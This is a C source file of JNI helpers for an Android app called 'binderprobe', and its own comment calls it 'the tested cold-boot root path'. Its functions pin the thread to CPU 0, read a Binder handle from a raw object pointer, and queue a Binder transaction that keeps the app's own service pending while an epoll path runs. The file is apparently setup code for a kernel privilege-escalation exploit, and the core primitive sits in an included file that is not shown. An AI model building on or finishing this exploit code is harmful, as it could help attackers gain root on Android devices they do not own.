/* JNI entry points for the tested cold-boot root path.
 * The active Binder primitive is in compose.c, included below.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <jni.h>
#include <dirent.h>
#include <linux/android/binder.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <poll.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <unistd.h>


/* This image's libbinder stores BpBinder::mHandle at object+4.
 * The caller supplies its own BinderProxy.mObject; this read is guarded. */
JNIEXPORT jint JNICALL
Java_org_local_lidar_binderprobe_ProbeService_nativeInspectBinderProxy(
    JNIEnv *env, jclass klass, jlong object) {
    (void)env;
    (void)klass;
    uint64_t raw = (uint64_t)object;
    uint32_t pointer = (uint32_t)raw;
    uint32_t upper = (uint32_t)(raw >> 32);
    /* ART sign-extends some 32-bit native pointer values into Java longs. */
    if ((upper != 0 && upper != UINT32_MAX) || pointer == 0 ||
        (pointer & 3) != 0)
        return -1;
    int32_t handle = *(const int32_t *)((uintptr_t)pointer + 4);
    return handle > 0 && handle < 100000 ? handle : -2;
}

JNIEXPORT jint JNICALL
Java_org_local_lidar_binderprobe_ProbeService_nativePinCpuZero(
    JNIEnv *env, jclass klass) {
    (void)env;
    (void)klass;
    cpu_set_t cpus;
    CPU_ZERO(&cpus);
    CPU_SET(0, &cpus);
    return sched_setaffinity(0, sizeof(cpus), &cpus) == 0 ? 0 : -errno;
}

/* Locate our Binder descriptor and queue the transaction that keeps our own
 * BlockingService pending while the checked epoll path runs. */
JNIEXPORT jint JNICALL
Java_org_local_lidar_binderprobe_ProbeService_nativePendingSelfBinder(
    JNIEnv *env, jclass klass, jint handle) {
    (void)env;
    (void)klass;
    if (handle <= 0 || handle >= 100000) return -10;
    DIR *directory = opendir("/proc/self/fd");
    if (!directory) return -11;
    int binder = -1;
    struct dirent *entry;
    while ((entry = readdir(directory)) != NULL) {
        char *end = NULL;
        long candidate = strtol(entry->d_name, &end, 10);
        if (!end || *end || candidate < 0 || candidate > 1024) continue;
        char path[96];
        char target[128];
        snprintf(path, sizeof(path), "/proc/self/fd/%ld", candidate);
        ssize_t length = readlink(path, target, sizeof(target) - 1);
        if (length < 0) continue;
        target[length] = 0;
        if (strcmp(target, "/dev/binder") == 0) {
            binder = (int)candidate;
            break;
        }
    }
    closedir(directory);
    if (binder < 0) return -12;
    struct binder_version version = {0};
    if (ioctl(binder, BINDER_VERSION, &version) != 0 || version.protocol_version != 8)
        return -13 - version.protocol_version;
    struct {
        uint32_t command;
        struct binder_transaction_data transaction;
    } __attribute__((packed)) request = {0};
    request.command = BC_TRANSACTION;
    request.transaction.target.handle = (uint32_t)handle;
    request.transaction.code = 1;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(request);
    bwr.write_buffer = (binder_uintptr_t)&request;
    if (ioctl(binder, BINDER_WRITE_READ, &bwr) != 0)
        return -2000 - errno;
    if (bwr.write_consumed != sizeof(request))
        return -2100 - (int)bwr.write_consumed;
    uint32_t response[64] = {0};
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(response);
    bwr.read_buffer = (binder_uintptr_t)response;
    if (ioctl(binder, BINDER_WRITE_READ, &bwr) != 0)
        return -3000 - errno;
    for (size_t i = 0; i < bwr.read_consumed / sizeof(uint32_t); i++) {
        if (response[i] == BR_TRANSACTION_COMPLETE) return 1000 + binder;
    }
    return -4000 - (int)bwr.read_consumed;
}

#define RECV_READY_MAGIC UINT64_C(0x4c52454356524459)
#define RECV_RESULT_MAGIC UINT64_C(0x4c52454356525354)
struct recv_child_ready { uint64_t magic, user_address; };
struct recv_child_result {
    uint64_t magic;
    int64_t received;
    int32_t saved_errno;
    uint32_t first16_unchanged;
    uint32_t marker_ok;
    uint8_t first16[16];
};

_Static_assert(sizeof(struct recv_child_ready) == 16, "ready wire layout");
_Static_assert(sizeof(struct recv_child_result) == 48, "result wire layout");

static int read_exact_timeout(int fd, void *buffer, size_t length, int timeout_ms) {
    uint8_t *cursor = buffer;
    while (length) {
        struct pollfd pfd = {.fd = fd, .events = POLLIN};
        int ready = poll(&pfd, 1, timeout_ms);
        if (ready < 0 && errno == EINTR) continue;
        if (ready <= 0 || !(pfd.revents & (POLLIN | POLLHUP))) return -1;
        ssize_t got = read(fd, cursor, length);
        if (got < 0 && errno == EINTR) continue;
        if (got <= 0) return -1;
        cursor += got;
        length -= (size_t)got;
    }
    return 0;
}

static int64_t monotonic_milliseconds(void) {
    struct timespec now;
    return clock_gettime(CLOCK_MONOTONIC, &now) == 0
        ? (int64_t)now.tv_sec * 1000 + now.tv_nsec / 1000000 : -1;
}

static void hex8(char output[17], const uint8_t *input) {
    static const char digits[] = "0123456789abcdef";
    for (unsigned i = 0; i < 8; ++i) {
        output[i * 2] = digits[input[i] >> 4];
        output[i * 2 + 1] = digits[input[i] & 15];
    }
    output[16] = 0;
}

static int shared_bytes_seen(const volatile uint8_t *mapping,
                             const uint8_t *pattern, size_t length) {
    for (size_t i = 0; i < length; ++i)
        if (mapping[i] != pattern[i]) return 0;
    return 1;
}

#include "compose.c"
